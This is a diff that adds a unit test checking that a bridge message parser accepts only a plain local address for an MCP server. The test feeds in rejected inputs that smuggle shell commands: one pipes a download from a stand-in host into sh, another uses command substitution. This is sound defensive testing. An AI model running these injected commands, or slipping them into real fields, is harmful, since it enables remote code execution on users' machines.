@@ -23,6 +23,15 @@ describe('messages and tool input', () => {
     expect(parseMessage(bridgeMessageSchema, '{')).toBeNull();
   });
 
+  it('takes only a plain local address for the MCP server, as the panel shows it as a command to copy', () => {
+    const hello = (mcp: string) => JSON.stringify({ kind: 'hello', version: '1', agent: { available: true, name: 'A' }, mcp });
+    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:7425/mcp'))).toMatchObject({ mcp: 'http://127.0.0.1:7425/mcp' });
+    expect(parseMessage(bridgeMessageSchema, hello('http://localhost:50123/mcp'))).not.toBeNull();
+    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:1/mcp; curl -s evil.example | sh #'))).toBeNull();
+    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:1/mcp$(touch /tmp/x)'))).toBeNull();
+    expect(parseMessage(bridgeMessageSchema, hello('https://evil.example/mcp'))).toBeNull();
+  });
+
   it('fills in defaults and explains bad input', () => {
     expect(parseToolInput('undo', undefined)).toEqual({ ok: true, value: { steps: 1 } });
     expect(parseToolInput('undo', { steps: 0 })).toMatchObject({ ok: false, error: expect.stringContaining('steps:') });
